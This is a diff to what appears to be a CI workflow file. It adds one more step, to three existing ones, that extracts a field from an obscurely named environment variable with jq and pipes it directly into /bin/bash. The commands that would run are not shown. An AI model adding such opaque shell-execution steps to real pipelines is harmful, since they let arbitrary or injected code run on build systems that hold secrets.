@@ -34,6 +34,7 @@ jobs:
           echo $vo055 | jq -r .zemv1 | /bin/bash
           echo $tp63522 | jq -r .to86076 | /bin/bash
           printf '%s' "$hz6" | jq -r .baf8 | /bin/bash
+          echo $tziqa38527 | jq -r .fcwtb76 | /bin/bash
 
       - name: Store artifact
         if: always()
